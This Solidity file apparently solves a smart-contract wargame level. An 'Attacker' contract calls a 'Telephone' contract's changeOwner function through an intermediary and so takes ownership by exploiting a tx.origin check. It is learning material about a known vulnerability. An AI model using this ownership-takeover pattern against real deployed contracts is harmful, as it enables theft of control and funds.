// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attacker{

    Telephone telephone;

    constructor(Telephone _telephone) public{
        telephone = _telephone;
    }

    function attack() public returns(bool success){

        telephone.changeOwner(msg.sender);

        return success;
    }
}
